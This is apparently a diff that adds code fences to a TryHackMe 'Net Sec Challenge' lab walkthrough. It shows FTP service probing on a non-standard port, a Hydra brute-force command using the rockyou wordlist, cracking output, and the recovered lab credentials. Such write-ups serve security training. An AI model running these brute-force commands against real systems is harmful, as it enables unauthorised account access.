@@ -47,6 +47,7 @@ Network Distance: 4 hops
 The web service on 8080 turned out to be little more than a bare Node.js/Express instance, so I widened the scan and found something far more interesting: an FTP service tucked away on the non-standard port 10021. I connected to it directly to see what banner it presented and whether an anonymous or guessable account would get me anywhere:
 
 
+```console
 ❯ k1b0r@FR13NDSthm/boxes/Net_Sec_Challenge took 37s 
 ❯ ftp 10.10.180.76 -p 10021
 Connected to 10.10.180.76.
@@ -58,11 +59,13 @@ Password:
 Remote system type is UNIX.
 Using binary mode to transfer files.
 ftp> 
+```
 
 
 The vsFTPd 3.0.3 banner and the fact that the username `eddie` was accepted before the password prompt stopped me told me I had a legitimate account to brute-force against. I put together a small wordlist of candidate usernames and pointed Hydra at the FTP service using rockyou.txt for passwords:
 
 
+```console
 ❯ k1b0r@FR13NDSthm/boxes/Net_Sec_Challenge via 🐍 v3.10.1 took 7s 
 ❯ hydra -L users -P /opt/SecLists/Passwords/rockyou.txt ftp://10.10.180.76 -s 10021 -t 64
 Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -75,6 +78,8 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 21:09:
 [STATUS] 7174157.50 tries/min, 14348315 tries in 00:02h, 14340610 to do in 00:02h, 64 active
 [STATUS] 4783415.33 tries/min, 14350246 tries in 00:03h, 14338679 to do in 00:03h, 64 active
 ^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+```
+```console
 ❯ k1b0r@FR13NDSthm/boxes/Net_Sec_Challenge via 🐍 v3.10.1 took 3m3s 
 
 
@@ -94,6 +99,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 21:29:
 [WARNING] Writing restore file because 35 final worker threads did not complete until end.
 [ERROR] 35 targets did not resolve or could not be connected
 [ERROR] 0 target did not complete
+```
 
 
 With two valid FTP credential pairs recovered, `eddie:jordan` and `quinn:andrea`, I still wanted to check the website itself more closely, and since the target sat on TryHackMe's internal 10.10.0.0/16 range, that meant working from the AttackBox rather than my own host in order to actually reach it.
